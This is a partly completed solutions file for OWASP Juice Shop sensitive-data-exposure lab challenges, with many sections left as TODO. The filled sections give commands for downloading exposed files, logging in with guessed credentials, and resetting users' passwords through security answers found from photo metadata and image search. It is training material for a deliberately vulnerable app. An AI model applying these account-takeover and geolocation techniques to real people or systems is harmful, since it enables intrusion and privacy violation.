# Sensitive Data Exposure

## Access Log

Gain access to any access log file of the server

```bash
TODO
```

## Confidential Document

Access a confidential document

```bash
# no gobuster
# status code is rigged: always 200 instead of 404

# http://juiceshop:3000/ftp/order_<ORDER_ID>.pdf
curl -O http://juiceshop:3000/ftp/acquisitions.md
```

## Email Leak

Perform an unwanted information disclosure by accessing data cross-domain

```bash
TODO
```

## Exposed Metrics

* [Prometheus](https://prometheus.io/docs/introduction/overview)

Find the endpoint that serves usage data to be scraped by a popular monitoring system

```bash
http http://juiceshop:3000/metrics
```

## Forgotten Developer Backup

Access a developer's forgotten backup file

```bash
TODO
```

## Forgotten Sales Backup

Access a salesman's forgotten backup file

```bash
TODO
```

## GDPR Data Theft

Steal someone else's personal data without using Injection

```bash
TODO
```

## Leaked Access Logs

Dumpster dive the Internet for a leaked password and log in to the original user account it belongs to

```bash
TODO
```

## Leaked Unsafe Product

Identify an unsafe product that was removed from the shop and inform the shop which ingredients are dangerous

```bash
TODO
```

## Login Amy

Log in with Amy's original user credentials

```bash
# husband: Kif Kroker
# https://futurama.fandom.com/wiki/Amy_Wong-Kroker

# The challenge description contains a few sentences which give away some information how Amy decided to strengthen her password.
# (This could take 93.83 billion trillion trillion centuries to brute force, but luckily she did not read the "One Important Final Note")
# https://www.grc.com/haystack.htm

http http://juiceshop:3000/rest/user/login email="amy@juice-sh.op" password="K1f....................."
```

## Login MC SafeSearch

Log in with MC SafeSearch's original user credentials

```bash
# https://www.youtube.com/watch?v=v59CX2DiX0Y
http http://juiceshop:3000/rest/user/login email="mc.safesearch@juice-sh.op" password="Mr. N00dles"
```

## Meta Geo Stalking

Determine the answer to John's security question

```bash
curl -sS -O http://juiceshop:3000/assets/public/images/uploads/favorite-hiking-place.png

# GPS Position
exiftool favorite-hiking-place.png

# convert https://gps-coordinates.org/coordinate-converter.php
# DMS (degrees, minutes, seconds): 36 deg 57' 31.38" N, 84 deg 20' 53.58" W
# DD (decimal degrees): 36.95871666666667, -84.34821666666666
# address: 1–251 Two Bridge Rd, London, KY 40744, United States

# security question: What's your favorite place to go hiking?
curl -sS http://juiceshop:3000/rest/user/reset-password \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"john@juice-sh.op","answer":"Daniel Boone National Forest","new":"12345","repeat":"12345"}'
```

## Misplaced Signature File

Access a misplaced SIEM signature file.
```bash
TODO
```

## NFT Takeover

Take over the wallet containing our official Soul Bound Token (NFT).

```bash
TODO missing
```

## Reset Uvogin's Password

Reset Uvogin's password via the Forgot Password mechanism

```bash
TODO
```

## Retrieve Blueprint

Deprive the shop of earnings by downloading the blueprint for one of its products

```bash
TODO
```

## Visual Geo Stalking

Determine the answer to Emma's security question

```bash
curl -sSO http://juiceshop:3000/assets/public/images/uploads/IMG_4253.jpg

# try google upload https://images.google.com

# security question: Company you first work for as an adult?
curl -sS http://juiceshop:3000/rest/user/reset-password \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"emma@juice-sh.op","answer":"ITsec","new":"12345","repeat":"12345"}'
```
